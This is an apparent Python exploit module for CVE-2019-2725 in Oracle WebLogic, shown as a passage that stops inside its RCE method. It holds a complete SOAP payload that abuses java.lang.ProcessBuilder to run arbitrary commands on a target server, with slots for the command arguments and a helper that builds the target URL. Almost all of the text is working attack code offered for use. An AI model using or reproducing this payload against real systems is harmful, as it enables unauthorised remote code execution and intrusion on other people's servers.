import requests
import warnings
warnings.filterwarnings("ignore", message="Unverified HTTPS request")
from colorama import init, Fore, Back, Style
import uuid
init(autoreset=True)
class Scan:
	def __init__(self, Protocol, Host, Port, BasePath=''):
		print('Scanning CVE-2019-2725...')
		self.Protocol = Protocol
		self.Host = Host
		self.Port = Port
		self.BasePath = BasePath
		self.TARGET = '{Protocol}://{Host}:{Port}{BasePath}'.format(Protocol=Protocol, Host=Host, Port=Port, BasePath=BasePath)

	def RCE(self, command):
		payload = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"xmlns:wsa="http://www.w3.org/2005/08/addressing"xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>uSdXzTxLe7ZyNm87XVYtmZA6</wsa:Action><wsa:RelatesTo>czQvyAEJagPY3uJLPCUSMcwf</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>{}</string></void><void index="1"><string>{}</string></void><void index="2"><string>{}</string></void></array><void method="start"/></void></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'